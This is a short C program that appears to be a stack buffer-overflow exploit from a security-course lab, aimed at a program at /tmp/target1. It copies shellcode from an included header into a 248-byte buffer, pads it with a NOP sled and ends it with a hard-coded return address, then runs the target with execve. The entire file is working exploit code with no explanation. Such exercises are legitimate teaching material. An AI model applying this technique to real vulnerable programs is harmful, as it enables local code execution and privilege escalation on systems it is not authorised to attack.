#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];
  char buff[248];

  for (int i = 0; i<45; i++)
{
  buff[i] = shellcode[i];
}
  for (int i=0; i<199; i++)
{
  buff[i+45] = '\x90';
}
  buff[244] = '\x38';
  buff[245] = '\xfc';
  buff[246] = '\xff';
  buff[247] = '\xbf';

  args[0] = TARGET; args[1] = buff; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
